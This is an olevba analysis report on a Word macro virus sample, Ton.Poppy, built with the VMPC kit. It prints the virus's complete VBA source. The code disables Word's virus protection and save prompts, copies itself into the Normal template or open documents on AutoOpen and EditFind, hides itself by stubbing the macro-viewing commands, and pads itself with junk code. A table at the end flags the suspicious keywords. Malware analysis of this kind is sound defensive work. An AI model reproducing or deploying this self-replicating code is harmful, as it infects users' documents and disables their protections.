olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.VMPC-based-ee657ef3b3bd8baf643d6274a6005d4f17edd489
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.VMPC-based-ee657ef3b3bd8baf643d6274a6005d4f17edd489 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO ton.bas 
in file: Virus.MSWord.VMPC-based-ee657ef3b3bd8baf643d6274a6005d4f17edd489 - OLE stream: 'Macros/VBA/ton'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
    
Sub ton()
    
    'VMPCK 1.0d w/Random Path + Update
    '=================================
    'Code Written by VicodinES
    '=================================
    'Poppy ID : 5971-KiSo92705971.c
    '=================================
    'This Virus Is: Ton.Poppy
    
On Error Resume Next
Options.ConfirmConversions = False
Options.VirusProtection = False
Options.SaveNormalPrompt = False
VBE.ActiveVBProject.VBComponents("ton").Export "c:\ton.drv"
UhFt2564 = GtQnHnSe & IeEz14207 & Int(Rnd * 4313)
ActiveDocument.ReadOnlyRecommended = False
GqAuSqFe = KqRh6309 & NfSn13700
UyJmFeGn = QpDy8641 & HlNj7382
If NormalTemplate.VBProject.VBComponents.Item("ton").Name <> "ton" Then JnCj5971908710 = True
If ActiveDocument.VBProject.VBComponents.Item("ton").Name <> "ton" Then BfIh90874 = True
HxLl10847 = GpBnAvMv & VjOw5380 & Int(Rnd * 1946)
If JnCj5971908710 = True And BfIh90874 = False Then Set GyLj908759719 = NormalTemplate.VBProject.VBComponents
If JnCj5971908710 = False And BfIh90874 = True Then Set GyLj908759719 = ActiveDocument.VBProject.VBComponents
GyLj908759719.import "c:\ton.drv"
If activeinst = False Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
If BfIh90874 = False Then If NormalTemplate.Saved = False Then NormalTemplate.Save
AnJe6456 = TlCxElKu & BsTy3108 & UpQkIwPf & LsQt6789
LkHm12230 = NiGqGtIf & CpEq8762 & SjFfOsKi & MvHz4895
NrTrQiJi = OxSj4975 & IuIt8373
'VMPCK v1.0d [The Final Version?]
RkTyVmPi:
End Sub
Sub EditFind()
    On Error Resume Next
IrCrHpKx = CrGy9473 & EmBq10278
Dialogs(wdDialogEditFind).Show
MlDeEtSf = CuDf7106 & RqFz9939
    Call ton
LrLeEyMg = TqSr10047 & KrBi15187
End Sub
Sub AutoOpen()
    On Error Resume Next
    Call ton
RnEq8088 = NvNqVeAi & RxVh13176 & VlDzKjPt & CpRs17871
End Sub
Sub ToolsMacro()
    On Error Resume Next
BpMm13945 = ChBsImDo & TvFk12621 & Int(Rnd * 4332)
TfEgIhFo = NgDz17452 & OmQr11744
End Sub
Sub FileTemplates()
    On Error Resume Next
GmFk840 = NlHhDsIk & UqGo10932 & Int(Rnd * 3551)
NyJf4433 = RsPuOrTw & QkDj11891 & Int(Rnd * 2841)
JjNmVyBv = MkHy2639 & DqOj15529
End Sub
Sub ViewVBCode()
    On Error Resume Next
HhQyLiDy = EyBn12965 & CsGy9447
EpEs7674 = BnHeDpGz & CqGn8625 & Int(Rnd * 2013)
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

